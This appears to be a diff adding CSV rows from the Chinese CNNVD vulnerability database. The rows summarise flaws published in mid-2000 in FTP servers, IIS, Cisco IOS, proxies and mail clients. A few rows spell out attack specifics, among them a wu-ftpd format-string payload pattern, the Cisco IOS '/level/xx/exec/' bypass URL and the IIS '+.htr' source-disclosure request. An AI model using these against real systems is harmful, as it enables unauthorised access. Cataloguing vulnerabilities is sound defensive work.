+xconq多重缓冲区溢出漏洞,CNNVD-200006-091,2000-06-22,2005-10-20,中危,授权问题,Red Hat Linux xconq和cconq game程序存在缓冲区溢出漏洞。本地用户借助超长DISPLAY环境变量提升额外特权。,CVE-2000-0618
+Wu-ftpd 2.6.0 SITE EXEC远程格式串溢出漏洞,CNNVD-200007-013,2000-06-22,2005-05-02,超危,授权问题,Washington University FTP Server是一个非常流行的Unix系统下的FTP服务器。很多Unix和Linux的发行版本都把它作为默认安装的FTP服务器。 Wu-ftpd在SITE EXEC实现上存在格式化串溢出漏洞，远程攻击者可能利用此漏洞通过溢出攻击以root用户的权限执行任意指令。 Wu-ftpd的SITE EXEC将用户输入的数据错误的作为格式字符串传送给vsnprintf()函数，攻击者可以构造一个特殊的格式字符串，例如<retloc>%.f%.f%.f %.<ret>d%n来覆盖堆栈中的某些重要数据，返回地址或者保存的uid等等，攻击者可以远程执行系统命令。这种攻击并不等同于通常的缓冲区溢出攻击，主要是错误的使用vsnprintf()以及缺乏对用户输入数据的检查引起的。,CVE-2000-0573
+Allaire JRun 2.3.x JSP文件访问控制漏洞,CNNVD-200006-093,2000-06-22,2006-09-20,中危,授权问题,Allaire JRun 2.3.x版本JSP示例文件存在漏洞。远程攻击者利用此漏洞可以访问任意文件（如借助viewsource.jsp）或获得配置信息。,CVE-2000-0540
+NetWin dMailWeb和 cwMai拒绝服务漏洞,CNNVD-200006-097,2000-06-23,2005-05-02,低危,授权问题,NetWin dMailWeb和 cwMail的默认配置信任所有POP服务器。本地用户利用此漏洞可以绕过普通认证并导致拒绝服务。,CVE-2000-0611
+NetWin dMailWeb and cwMail认证漏洞,CNNVD-200006-096,2000-06-23,2005-05-02,低危,授权问题,NetWin dMailWeb and cwMail 2.6g和更早的版本存在漏洞。远程攻击者借助包含回车的用户名可以绕过认证并使用邮件中继服务器。,CVE-2000-0610
+ISC DHCP客户端缓冲区溢出漏洞,CNNVD-200006-098,2000-06-24,2005-05-02,超危,授权问题,ISC DHCP客户端程序dhclient存在漏洞。远程攻击者借助shell元字符可以执行任意命令。,CVE-2000-0585
+LeafDigital LeafChat 1.7 DoS漏洞,CNNVD-200006-099,2000-06-25,2005-05-02,低危,其他,LeafChat 1.7版本IRC客户端存在漏洞。远程IRC服务器通过迅速发送大量错误信息导致拒绝服务。,CVE-2000-0601
+NetWare 5.1 Netscape Enterprise Server拒绝服务漏洞,CNNVD-200006-103,2000-06-26,2005-05-02,高危,授权问题,NetWare 5.1中Netscape Enterprise Server存在漏洞。远程攻击者借助畸形URL导致拒绝服务或执行任意命令。,CVE-2000-0600
+HP TurboIMAGE DBUTIL特权提升漏洞,CNNVD-200006-102,2000-06-26,2005-05-02,中危,授权问题,HP TurboIMAGE DBUTIL存在漏洞。本地用户借助DBUTIL.PUB.SYS可以提升额外特权。,CVE-2000-0616
+Flowerfire Sawmill文件访问漏洞,CNNVD-200006-100,2000-06-26,2005-05-02,高危,信息泄露,SawMill 5.0.21版本CGI程序存在漏洞。远程攻击者通过列表rfcf参数文件可以读取任意文件的第一行，那些文件的内容SawMill试图解析配置命令。,CVE-2000-0588
+Fortech Proxy+远程登录网关漏洞,CNNVD-200006-105,2000-06-26,2005-05-02,中危,授权问题,Fortech Proxy+存在漏洞。远程攻击者通过远程代理重定向连接可以绕过管理员服务的访问限制。,CVE-2000-0598
+glftpd privpath指令漏洞,CNNVD-200006-101,2000-06-26,2005-07-27,超危,授权问题,glftpd 1.18版本中privpath指令存在漏洞。远程攻击者通过使用名称补全功能可以绕过目录的访问控制。,CVE-2000-0587
+Flowerfire Sawmill弱密码加密漏洞,CNNVD-200006-104,2000-06-26,2005-10-20,高危,加密问题,SawMill 5.0.21版本使用弱加密存储密码。攻击者可以轻松破解密码并修改SawMill配置。,CVE-2000-0589
+SapporoWorks WinProxy缓冲区溢出漏洞,CNNVD-200006-110,2000-06-27,2006-09-22,高危,授权问题,"WinProxy 2.0和2.0.1版本存在缓冲区溢出漏洞。远程攻击者借助超长USER, PASS, LIST, RETR,或DELE命令可以执行任意命令。",CVE-2000-0592
+Microsoft Internet Explorer 5.01 和Excel/Powerpoint 2000 ActiveX 对象执行漏洞,CNNVD-200006-107,2000-06-27,2005-10-12,高危,授权问题,"Microsoft Office 2000 (Excel and PowerPoint)和PowerPoint 97标记为可安全执行脚本。远程攻击者借助Visual Basic for Applications (VBA) SaveAs函数强制Internet Explorer或电子邮件客户端将文件保存到任意位置，又称为""Office HTML Script""漏洞。",CVE-2000-0597
+FirstClass Internet Services server拒绝服务漏洞,CNNVD-200006-109,2000-06-27,2005-05-02,低危,授权问题,FirstClass Internet Services server 5.770和其他6.1之前的版本存在漏洞。远程攻击者通过发送含有超长To：邮件标题的电子邮件导致拒绝服务。,CVE-2000-0570
+SapporoWorks WinProxy缓冲区溢出漏洞,CNNVD-200006-108,2000-06-27,2006-09-22,低危,授权问题,WinProxy 2.0和2.0.1版本存在漏洞。远程攻击者通过发送不含HTTP版本号列表的HTTP GET请求导致拒绝服务。,CVE-2000-0593
+Cisco IOS Web配置接口安全认证可被绕过漏洞,CNNVD-200107-164,2000-06-27,2005-05-02,超危,授权问题,IOS是Cisco公司开发的路由器固件。IOS支持很多Cisoco设备(包括路由器和交换机)。 在Cisco IOS 11.3开始的版本存在一个安全问题，如果它开放了Web管理接口，将允许任意远程攻击者获取该设备的完全的管理权限。 攻击者只需要构造一个如下的URL: http://<device_addres>/level/xx/exec/.... 这里的xx是一个从16-99之间的整数。对于不同的设备，这个数值可能是不同的，但是攻击者仅需要测试84次即可找到正确的数值。 这个问题可能导致远程用户获取完全的管理权限，并进一步对网络进行渗透，也可能造成拒绝服务攻击漏洞。,CVE-2001-0537
+Microsoft Internet Explorer 安全漏洞,CNNVD-200006-106,2000-06-27,2021-07-26,高危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 5.x版本开启Microsoft Access数据库文件文件之前无法警告用户，该文件引用于HTML文件ActiveX OBJECT标签。远程攻击者利用此漏洞可以执行任意文件，又称为""IE Script""漏洞。",CVE-2000-0596
+Microsoft Windows 9x / NT 4.0ARP伪造漏洞,CNNVD-200006-113,2000-06-29,2005-10-20,低危,其他,Windows 95和Windows 98无法正确处理伪造的ARP数据包。远程攻击者利用此漏洞可以覆盖在缓存表中的静态条目。,CVE-2000-0612
+"Dalnet IRC Server ""SUMMON""缓冲区溢出漏洞",CNNVD-200006-112,2000-06-29,2005-05-02,超危,授权问题,Dalnet IRC server 4.6.5版本存在缓冲区溢出漏洞。远程攻击者借助SUMMON命令导致拒绝服务或执行任意命令。,CVE-2000-0586
+iMesh.Com iMesh 1.02缓冲区溢出漏洞,CNNVD-200006-111,2000-06-29,2005-05-02,高危,授权问题,iMesh 1.02版本存在缓冲区溢出漏洞。远程攻击者借助超长iMesh端口字符串可以执行任意命令。,CVE-2000-0599
+Microsoft Windows 2000 Telnet Server DoS漏洞,CNNVD-200006-116,2000-06-30,2005-05-02,中危,其他,Windows 2000 Telnet Server存在漏洞。远程攻击者通过发送连续的二进制0数据流到不同TCP和UDP端口，这导致服务器崩溃。,CVE-2000-0581
+Sybergen Sygate拒绝服务漏洞,CNNVD-200006-118,2000-06-30,2005-05-02,低危,授权问题,Sybergen Sygate存在漏洞。远程攻击者借助发送畸形DNS UDP包到内部接口导致拒绝服务。,CVE-2000-0569
+Check Point Firewall-1 SMTP资源消耗漏洞,CNNVD-200006-117,2000-06-30,2006-01-04,低危,其他,Check Point FireWall-1 4.0和4.1版本存在漏洞。远程攻击者通过发送无效命令流（例如二进制0）到SMTP安全服务器代理导致拒绝服务。,CVE-2000-0582
+Sybergen Secure Desktop 2.1多重漏洞,CNNVD-200006-119,2000-06-30,2005-05-02,低危,其他,Sybergen Secure Desktop 2.1版本无法正确防止虚假路由器广告(ICMP type 9)。远程攻击者利用此漏洞可以修改默认路由。,CVE-2000-0568
+vpopmail格式化字符串借助用户输入漏洞,CNNVD-200006-114,2000-06-30,2005-05-02,低危,授权问题,vpopmail 4.8版本之前的vchkpw程序无法正确清洗调用到syslog的非信任格式化字符串。远程攻击者借助包含任意格式化指令的USER 或PASS命令导致拒绝服务漏洞。,CVE-2000-0583
+Microsoft Windows 2000远程CPU超载漏洞,CNNVD-200006-115,2000-06-30,2005-10-20,低危,其他,Windows 2000 Server存在漏洞。远程攻击者通过发送连续的二进制0数据流到不同TCP和UDP端口，这导致CPU使用率大大增加。,CVE-2000-0580
+Microsoft Windows NT 安全漏洞,CNNVD-200007-001,2000-07-01,2022-08-18,低危,其他,Microsoft Windows是美国微软（Microsoft）公司的一种桌面操作系统。 Microsoft Windows NT 存在安全漏洞，该漏洞源于管理员账户有默认的管理员默认名称。,CVE-1999-0585
+Canna远程缓冲区溢出漏洞,CNNVD-200007-002,2000-07-02,2005-05-02,超危,授权问题,Canna输入系统存在缓冲区溢出漏洞。远程攻击者可以借助带有超长用户名或群组名的SR_INIT命令执行任意命令。,CVE-2000-0584
+多个供应商man(1) 'makewhatis'不安全/tmp文件漏洞,CNNVD-200007-003,2000-07-03,2005-05-02,高危,其他,Linux man程序包中的makewhatis存在漏洞。本地用户可以借助符号连接攻击来覆盖文件。,CVE-2000-0566
+"BitchX IRC客户端""/INVITE""格式字符串漏洞",CNNVD-200007-004,2000-07-04,2006-09-05,低危,授权问题,BitchX IRC客户端不能正确净化不可信格式字符串，远程攻击者可以借助对名称中含特殊格式字符的信道的邀请来导致服务拒绝。,CVE-2000-0594
+Novell BorderManager URL规则限制绕过漏洞,CNNVD-200007-010,2000-07-05,2005-05-02,低危,授权问题,Novell BorderManager 3.0版本和3.5版本存在漏洞。远程攻击者可以通过请求URL中的编码字符绕过URL过滤。,CVE-2000-0591
+SSH票据缓存嗅探漏洞,CNNVD-200007-009,2000-07-05,2006-09-05,高危,授权问题,带有Kerberos认证支持的SSH 1.2.27版本在创建于正登陆用户当前目录的文件中储存Kerberos票据，当主目录安装在NFS上时，远程攻击者可以嗅探票据缓存。,CVE-2000-0575
+libedit任意命令执行漏洞,CNNVD-200007-007,2000-07-05,2005-05-02,中危,授权问题,libedit在当前文件目录中而不是在用户主目录中搜寻.editrc文件，本地用户可以通过在另一个目录中安装畸形.editrc来执行任意命令。,CVE-2000-0595
+LocalWEB HTTP缓冲区溢出漏洞,CNNVD-200007-011,2000-07-05,2005-05-02,低危,授权问题,LocalWEB HTTP server 1.2.0版本存在漏洞。远程攻击者可以借助超长GET请求导致服务拒绝。,CVE-2000-0571
+AIX Oracle Web Listener服务拒绝漏洞,CNNVD-200007-006,2000-07-05,2005-05-02,低危,授权问题,AIX 4.0.7.0.0版本和4.0.8.1.0版本的Oracle Web Listener存在漏洞。远程攻击者可以借助畸形URL导致服务拒绝。,CVE-2000-0576
+Cyrus IMAP Server 安全漏洞,CNNVD-201503-468,2000-07-05,2015-03-24,,授权问题,Cyrus IMAP Server是一款免费开放源代码IMAP协议实现，可使用在Unix和Linux操作系统下。 Cyrus IMAP Server中存在安全漏洞，该漏洞源于程序没有验证用户提交字段的内容。攻击者可利用该漏洞执行shell backtick扩展，执行任意命令。,null
+可见系统Razor密码文件漏洞,CNNVD-200007-008,2000-07-05,2005-10-20,中危,授权问题,Razor配置管理工具对密码文件使用弱加密术，本地用户可以提升特权。,CVE-2000-0572
+多个供应商ftpd setproctitle()格式字符串漏洞,CNNVD-200007-014,2000-07-07,2006-09-20,低危,授权问题,"例如OpenBSD ftpd,NetBSD ftpd,ProFTPd和Opieftpd的FTP服务器不能正确净化在setproctitle函数（有时被称作set_proc_title）中被使用的不可信格式字符串，远程攻击者可以导致服务拒绝或者执行任意命令。",CVE-2000-0574
+Novell BorderManage用户冒充漏洞,CNNVD-200007-012,2000-07-07,2005-05-02,高危,授权问题,Novell BorderManage中的ClientTrust程序不能正确地核实认证请求的起源，远程攻击者可以通过重放来自受害人机器端口3024的认证请求和响应来冒充另一个用户。,CVE-2000-0651
+Microsoft SQL Server 许可绕过漏洞,CNNVD-200007-015,2000-07-07,2006-09-01,中危,授权问题,"Microsoft SQL Server 7.0版本存在漏洞。本地用户可以借助暂时存储过程通过引用来绕过存储过程的许可，该漏洞也称为""Stored Procedure Permissions""漏洞。",CVE-2000-0603
+Guild FTPd文件存在确定漏洞,CNNVD-200007-016,2000-07-08,2006-09-05,高危,授权问题,Guild FTPd存在漏洞。远程攻击者可以借助..（点 点）攻击确定FTP根外文件的存在，该漏洞提供取决于文件存在与否的不同出错消息。,CVE-2000-0640
+Savant web服务器任意命令执行漏洞,CNNVD-200007-017,2000-07-08,2005-05-02,高危,授权问题,Savant web服务器存在漏洞。远程攻击者可以借助超长GET请求来执行任意命令。,CVE-2000-0641
+MiniVend shopping cart任意命令执行漏洞,CNNVD-200007-018,2000-07-10,2005-05-02,高危,授权问题,MiniVend shopping cart程序中的view_page.html样本页面存在漏洞。远程攻击者可以借助shell元字符来执行任意命令。,CVE-2000-0635
+Blackboard CourseInfo 4.0明文管理员密码漏洞,CNNVD-200007-020,2000-07-10,2005-10-20,低危,授权问题,Blackboard CourseInfo 4.0版本在访问控制允许用户访问密码的注册表钥明文中储存本地和SQL管理员用户名和密码。,CVE-2000-0605
+tnef 0-123邮件解码器文件覆盖漏洞,CNNVD-200007-019,2000-07-10,2005-10-20,超危,授权问题,Linux系统中Tnef程序存在漏洞。远程攻击者可以借助指定了解压缩输出绝对路径名的TNEF编码压缩附件来覆盖任意文件。,CVE-2000-0614
+WircSrv IRC Server服务拒绝漏洞,CNNVD-200007-021,2000-07-10,2005-05-02,低危,授权问题,WircSrv IRC Server 5.07s版本存在漏洞。远程攻击者可以借助到服务器端口的超长字符串导致服务拒绝。,CVE-2000-0661
+VirusScan和NetShield 任意命令执行漏洞,CNNVD-200007-024,2000-07-11,2005-05-02,低危,授权问题,VirusScan 4.5版本和NetShield 4.5版本的默认安装程序有识别AutoUpgrade目录的注册表钥的不安全许可，本地用户可以通过在带有特洛伊木马的目录中替换SETUP.EXE来执行任意命令。,CVE-2000-0650
+Microsoft Enterprise Manager密码获得漏洞,CNNVD-200007-026,2000-07-11,2006-09-01,低危,授权问题,"Microsoft Enterprise Manager存在漏洞。本地用户可以借助Data Transformation Service (DTS)程序包Registered Servers Dialog会话来获得数据库密码，该漏洞也称为""DTS Password"" 漏洞的变体。",CVE-2000-0654
+Apache::ASP source.asp非法写入文件漏洞,CNNVD-200007-022,2000-07-11,2005-05-02,高危,授权问题,Apache::ASP是Apache的ASP解析模块，它的一个例子脚本./site/eg/source.asp存在一个安全问题。 远程攻击者可以利用source.asp将无用数据写入在同一目录的文件中。这些文件必须是apache Server运行身份有权写入的。,CVE-2000-0628
+Novell NetWare服务拒绝漏洞,CNNVD-200007-027,2000-07-11,2005-05-02,低危,授权问题,Novell NetWare 5.0版本存在漏洞。远程攻击者可以通过伪造带随机数据的端口40193来导致服务拒绝。,CVE-2000-0669
+BB4技术Big Brother目录遍历漏洞,CNNVD-200007-025,2000-07-11,2006-11-14,超危,授权问题,Big Brother 1.4h1版本及之前版本中bb-hostsvc.sh存在漏洞。远程攻击者可以借助对HOSTSVC参数的..（点 点）攻击来读取任意文件。,CVE-2000-0638
+WFTPD RNTO服务拒绝漏洞,CNNVD-200007-023,2000-07-11,2005-10-20,低危,授权问题,WFTPD和WFTPD Pro 2.41版本存在漏洞。本地用户可以通过在RENAME FROM (RNFR)命令之前执行RENAME TO (RNTO)命令来导致服务拒绝。,CVE-2000-0648
+dump Caldera rmt特权提升漏洞,CNNVD-200007-032,2000-07-12,2005-07-27,高危,授权问题,dump程序包0.4b4版本中Caldera rmt命令存在漏洞。本地用户可以提升根特权。,CVE-2000-0372
+Sun Java Web服务器漏洞,CNNVD-200007-029,2000-07-12,2005-10-20,高危,其他,Sun Java web server 2.0版本及之前版本的默认配置存在漏洞。远程攻击者可以借助board.html通过上传Java代码到服务器然后直接调用JSP编译控制器来执行任意命令。,CVE-2000-0629
+WebActive HTTP Server服务拒绝漏洞,CNNVD-200007-028,2000-07-12,2005-05-02,低危,授权问题,WebActive HTTP Server 1.00版本存在缓冲区溢出漏洞。远程攻击者可以借助超长URL导致服务拒绝。,CVE-2000-0643
+"CVSWeb不安全perl ""open""漏洞",CNNVD-200007-033,2000-07-12,2005-05-02,高危,授权问题,CVSWeb 1.80版本中cvsweb CGI脚本存在漏洞。带有到CVS储存器的写访问的远程攻击者借助shell元字符来执行任意命令。,CVE-2000-0670
+Samba smbmnt安全漏洞,CNNVD-200312-512,2000-07-12,2022-08-18,高危,其他,Samba是Samba团队开发的一套可使UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS网络协议做连结的自由软件。该软件支持共享打印机、互相传输资料文件等。smbmnt是其中的一个装载SMB文件系统的协助工具。 Samba smbmnt中存在安全漏洞。本地攻击者可利用该漏洞在任意位置挂载文件系统。,CVE-1999-0812
+Virtual Visions FTP浏览器ftp.pl CGI程序目录读取漏洞,CNNVD-200007-031,2000-07-12,2005-05-02,低危,授权问题,Virtual Visions FTP浏览器的ftp.pl CGI程序存在漏洞。远程攻击者可以借助..（点 点）攻击读取文档根外的目录。,CVE-2000-0674
+WebActive HTTP Server记录查看漏洞,CNNVD-200007-034,2000-07-12,2005-05-02,低危,授权问题,WebActive HTTP Server 1.00版本的默认配置在文档根中储存web访问记录active.log，远程攻击者可以通过直接请求页面来查看记录。,CVE-2000-0642
+WorldClient WDaemon web服务器任意文件读取漏洞,CNNVD-200007-030,2000-07-12,2005-05-02,低危,授权问题,WorldClient 2.1版本的WDaemon web服务器存在漏洞。远程攻击者可以借助..（点 点）攻击来读取任意文件。,CVE-2000-0660
+Microsoft Internet Information Services 信息泄露漏洞,CNNVD-200007-036,2000-07-13,2021-08-16,低危,信息泄露,Microsoft Internet Information Services（IIS）是美国微软（Microsoft）公司的一款适用于Windows Server平台的Web服务器。 Microsoft Internet Information Services 4.0版本存在信息泄露漏洞。远程攻击者可以借助被基本认证保护并且无区域定义的网页的HTTP 1.0请求来获得服务器的内部IP地址。,CVE-2000-0649
+Infopulse Gatekeeper缓冲区溢出漏洞,CNNVD-200007-035,2000-07-13,2005-05-02,高危,授权问题,Infopulse Gatekeeper 3.5版本及之前版本存在缓冲区溢出漏洞。远程攻击者可以借助超长字符串来执行任意命令。,CVE-2000-0675
+Microsoft Internet Explorer安全漏洞,CNNVD-200007-037,2000-07-14,2021-07-27,低危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。远程攻击者可以通过重定向使用DHTML Edit Control (DHTMLED)的IFRAME内容来读取任意文件。,CVE-2000-0662
+IIS管理脚本服务拒绝漏洞,CNNVD-200007-038,2000-07-14,2005-10-12,低危,授权问题,"来自IIS 3.0版本，包括之后的IIS 4.0版本和5.0版本的管理脚本存在漏洞。远程攻击者可以通过访问无特殊参数的脚本来导致服务拒绝，也称为 ""Absent Directory Browser Argument"" 漏洞。",CVE-2000-0631
+L-Soft Listserv 1.8c 和1.8d版本档案超长Web QUERY_STRING缓冲区溢出漏洞,CNNVD-200007-041,2000-07-17,2005-05-02,高危,授权问题,L-Soft Listserv 1.8d版本及之前版本的web档案元件存在缓冲区溢出漏洞。远程攻击者可以借助超长查询字符串来执行任意命令。,CVE-2000-0632
+Microsoft IIS ISM.DLL文件名截断泄漏文件内容漏洞,CNNVD-200007-043,2000-07-17,2005-10-12,低危,授权问题,"IIS是Microsoft的一个产品，是用来在网站上提供HTTP、FTP等的服务器程序。运行在Windows NT和Windows 2000操作系统上。 NSFocus 安全小组发现了微软 IIS 4.0/5.0的一个安全漏洞。攻击者可以利用这个漏洞来获取某些特定类型文件(例如：.ASP，.ASA，.INI等等文本类型文件以及二进制文件)的全部或者部分内容。而正常情况下，攻击者是不应该有权限访问这些文件或者浏览文件内容的。 攻击者会构造一个特殊格式的URL请求，它由一个目标文件名再加上""+""号以及"".htr""后缀组成。例如：global.asa+.htr。当将这个URL提交给Microsoft IIS 4.0/5.0后，IIS会认为用户正在请求处理一个HTR文件，因此会将这个请求转交给ISM.DLL ASAPI应用程序去处理。ISM.DLL在打开并执行这个文件之前，会首先检查文件名。当在文件名中检查到一个""+""号以后，ISM.DLL会从这里将文件名截断，只保留""+""号以前的文件名(实际上就是真正要浏览的目标文件，例如：global.asa)，然后试图打开并执行它。如果该文件并不是HTR文件，ISM.DLL将会泄漏该文件的全部或者部分内容。通常，对于.ASP文件，ISM.DLL会删除其中的大部分内容，但是仍然可能泄漏一些敏感信息，例如包含文件(通常是.inc文件)的名字和路径等等。而对于global.asa文件，通常会将其全部内容显示出来，如果这个文件中包含一些重要敏感信息，例如SQL server数据库的用户名和密码，可能使攻击者更加容易地入侵或者攻击系统。",CVE-2000-0630
+O'Reilly WebSite GET缓冲区溢出漏洞,CNNVD-200007-042,2000-07-17,2006-09-22,超危,授权问题,O'Reilly WebSite Professional web server 2.4版本及之前版本存在缓冲区溢出漏洞。远程攻击者可以借助超长GET请求或Referrer标题来执行任意命令。,CVE-2000-0623
+GAMSoft Telsrv DoS漏洞,CNNVD-200007-040,2000-07-17,2005-05-02,低危,授权问题,GAMSoft TelSrv远程服务器1.5版本及之前版本存在漏洞。远程攻击者可以借助超长用户名来导致服务拒绝。,CVE-2000-0665
+BlackBoard CourseInfo修改CourseInfo数据库信息且提升特权漏洞,CNNVD-200007-047,2000-07-18,2005-05-02,高危,授权问题,BlackBoard CourseInfo 4.0版本不正确验证用户，本地用户通过直接调用支持CGI程序如：user_update_passwd.pl和user_update_admin.pl修改CourseInfo数据库信息且提升特权。,CVE-2000-0627
+Mandrake Linux用户模式数据包漏洞,CNNVD-200007-046,2000-07-18,2005-05-02,低危,授权问题,Mandrake Linux用户模式数据包存在漏洞。本地用户利用该漏洞重新启动或者暂停系统。,CVE-2000-0633
+NetZero ZeroPort 3.0版本弱加密术方式漏洞,CNNVD-200007-044,2000-07-18,2005-10-20,中危,授权问题,NetZero 3.0版本及之前版本对储存用户登录信息使用弱加密术，本地用户可以解密密码。,CVE-2000-0625
+CSM Alibaba Web服务器DoS漏洞,CNNVD-200007-045,2000-07-18,2005-10-20,中危,授权问题,Alibaba web服务器存在缓冲区溢出漏洞。远程攻击者可以借助超长GET请求来导致服务拒绝。,CVE-2000-0626
+Microsoft Outlook / Outlook Express GMT字段缓冲区溢出漏洞,CNNVD-200007-048,2000-07-18,2005-10-12,低危,授权问题,"Microsoft Outlook和Outlook Express存在缓冲区溢出漏洞。远程攻击者借助电子邮件头中的超长Date字段执行任意命令，又称为""Malformed E-mail Header""漏洞。",CVE-2000-0567
+O'Reilly WebSite 'webfind.exe'缓冲区溢出漏洞,CNNVD-200007-049,2000-07-19,2006-09-22,超危,授权问题,"O'Reilly WebSite Professional web server 2.x版本中的Webfind CGI程序存在缓冲区溢出漏洞。远程攻击者借助包含超长""keywords""参数的URL执行任意命令。",CVE-2000-0622
+HP JetDirect打印机服务拒绝漏洞,CNNVD-200007-051,2000-07-19,2005-05-02,低危,授权问题,HP JetDirect打印机G.08.20和H.08.20及其之前版本存在漏洞。远程攻击者借助畸形的FTP引用命令导致服务拒绝。,CVE-2000-0636
+Top Layer AppSwitch服务拒绝,CNNVD-200007-050,2000-07-19,2005-05-02,中危,授权问题,Top Layer AppSwitch 2500版本存在漏洞。远程攻击者借助畸形的ICMP包导致服务拒绝。,CVE-2000-0619
+LPRng记录信息漏洞,CNNVD-200007-052,2000-07-19,2006-09-20,低危,授权问题,LPRng 3.6.x版本不正确的安装lpd作为setuid根，本地用户利用该漏洞附加lpd痕迹且在文件中记录信息。,CVE-2000-0615
+Microsoft Outlook和Outlook Express读取客户端系统的文件漏洞,CNNVD-200007-054,2000-07-20,2005-10-12,高危,授权问题,"Microsoft Outlook 98和2000,还有Outlook Express 4.0x和5.0x版本存在漏洞。远程攻击者借助存储缓存以外文件的畸形HTML信息读取客户端系统的文件。又称为""Cache Bypass""漏洞。",CVE-2000-0621
+Apache Tomcat 安全漏洞,CNNVD-200007-053,2000-07-20,2022-03-10,低危,其他,Apache Tomcat是美国阿帕奇（Apache）基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。 Apache Tomcat 存在安全漏洞，该漏洞源于默认配置不限制/admin文本的访问权限，远程攻击者通过直接的调用管理servlets使得在根目录中添加一个文本从而读取任意文件。,CVE-2000-0672
+Winamp缓冲区溢出漏洞,CNNVD-200007-055,2000-07-20,2005-05-02,高危,授权问题,Winamp 2.64及其之前版本存在缓冲区溢出漏洞。远程攻击者通过超长#EXTINF:M3U播放列表的扩展执行任意命令。,CVE-2000-0624
+Apache Tomcat 3.1远程泄露服务器信息漏洞,CNNVD-200010-134,2000-07-20,2006-08-03,中危,授权问题,Apache Group Tomcat是一个免费开放源码的JSP服务器程序。 Apache Group Tomcat 3.1在处理不存在的JSP文件请求时存在问题，远程攻击者可能借此收集到服务器相关的配置信息。 当向Apache Group Tomcat 3.1提交请求，访问一个不存在的JSP文件时，服务器返回太多敏感信息，包括WEB服务物理路径。这些信息潜在损害着系统安全性，有可能被攻击者利用。,CVE-2000-0759
+Microsoft Outlook Express的持续邮件浏览器的链接漏洞,CNNVD-200007-056,2000-07-20,2005-10-20,低危,授权问题,"Microsoft Outlook Express存在漏洞。远程攻击者通过创建一个到Outlook Express窗口的持续浏览链接监测用户的电子邮件。又称为""Persistent Mail-Browser Link""漏洞。",CVE-2000-0653
+WFTPD 2.4.1RC11多个漏洞,CNNVD-200007-061,2000-07-21,2005-10-20,低危,授权问题,WFTPD和WFTPD Pro 2.41版本存在漏洞。远程攻击者通过在登录到服务器之前执行MLST命令导致服务拒绝。,CVE-2000-0647
+WFTPD和WFTPD Pro服务拒绝漏洞,CNNVD-200007-057,2000-07-21,2005-05-02,低危,授权问题,WFTPD和WFTPD Pro 2.41版本存在漏洞。远程攻击者通过LIST命令仍然执行时执行STAT命令从而导致服务拒绝。,CVE-2000-0644
+WFTPD 2.4.1RC11多个漏洞,CNNVD-200007-059,2000-07-21,2005-10-20,低危,授权问题,WFTPD和WFTPD Pro 2.41版本存在漏洞。远程攻击者通过在移动文件时执行STATUS (STAT)命令获取文件的真实路径名。,CVE-2000-0646
+WFTPD 2.4.1RC11多个漏洞,CNNVD-200007-060,2000-07-21,2005-10-20,低危,授权问题,"WFTPD和WFTPD Pro 2.41版本存在漏洞。远程攻击者通过使用RESTART (REST)命令且书写超出了文件的末尾，或者写入不存在的文件，借助如STORE UNIQUE (STOU), STORE (STOR),或者APPEND (APPE)命令导致服务拒绝。",CVE-2000-0645
+IBM WebSphere读取可执行web文件的源代码漏洞。,CNNVD-200007-062,2000-07-24,2006-08-21,低危,授权问题,"IBM WebSphere存在漏洞。远程攻击者通过使用包含""/servlet/file""字符串的URL直接调用默认的InvokerServlet从而读取可执行web文件的源代码。",CVE-2000-0652
+AnalogX Proxy DoS漏洞,CNNVD-200007-065,2000-07-25,2006-09-25,低危,授权问题,AnalogX proxy server 4.04及其之前版本存在缓冲区溢出漏洞。远程攻击者借助SOCKS4 CONNECT请求中的超长用户ID导致服务拒绝。,CVE-2000-0659
+AnalogX Proxy DoS漏洞,CNNVD-200007-066,2000-07-25,2006-09-25,低危,授权问题,AnalogX proxy server 4.04及其之前版本存在缓冲区溢出漏洞。远程攻击者借助FTP协议中的超长USER命令导致服务拒绝。,CVE-2000-0656
+Netscape Communicator JPEG评论堆覆盖漏洞,CNNVD-200007-067,2000-07-25,2005-05-16,低危,授权问题,Netscape Communicator 4.73及其之前版本存在漏洞。远程攻击者借助JPEG图像导致服务拒绝或者执行任意命令。该图像包含带有长度为1的非法字段的注释。,CVE-2000-0655
+AnalogX Proxy DoS漏洞,CNNVD-200007-068,2000-07-25,2006-09-25,中危,授权问题,AnalogX proxy server 4.04及其之前版本存在缓冲区溢出漏洞。远程攻击者借助POP3协议中的超长USER命令导致服务拒绝。,CVE-2000-0658
+Windows执行任意命令漏洞,CNNVD-200007-064,2000-07-25,2005-10-12,中危,授权问题,Windows NT和Windows 2000版本Windows Shell 可执行的(Explorer.exe)注册入口使用相关路径名。本地用户通过在%Systemdrive%目录中插入一个名为Explorer.exe的Trojan Horse从而执行任意命令。,CVE-2000-0663
+AnalogX Proxy DoS漏洞,CNNVD-200007-063,2000-07-25,2006-09-25,中危,授权问题,AnalogX proxy server 4.04及其之前版本存在缓冲区溢出漏洞。远程攻击者借助SMTP协议中的超长HELO命令导致服务拒绝。,CVE-2000-0657
+SimpleServer WWW目录遍历漏洞,CNNVD-200007-070,2000-07-26,2006-08-24,低危,授权问题,AnalogX SimpleServer:WWW 1.06及其之前版本存在漏洞。远程攻击者借助修改过的..（点 点）攻击读取任意文件。该攻击使用%2E URL为这些点编码。,CVE-2000-0664
+Microsoft Excel 97 / 2000 Register.ID漏洞,CNNVD-200007-069,2000-07-26,2005-10-12,中危,授权问题,"Microsoft Excel 97和22000版本存在漏洞。远程攻击者通过Register.ID函数使用指明恶意.dll执行任意命令。又称为""Excel REGISTER.ID Function""漏洞。",CVE-2000-0637
+Linux系统pam_console PAM模块访问系统控制且重新启动系统漏洞,CNNVD-200007-072,2000-07-27,2005-05-02,低危,授权问题,Linux系统中的pam_console PAM模块存在漏洞。当陈列管理员如gdm或者kdm具有XDMCP有效时，用户利用该漏洞访问系统控制且重新启动系统。,CVE-2000-0668
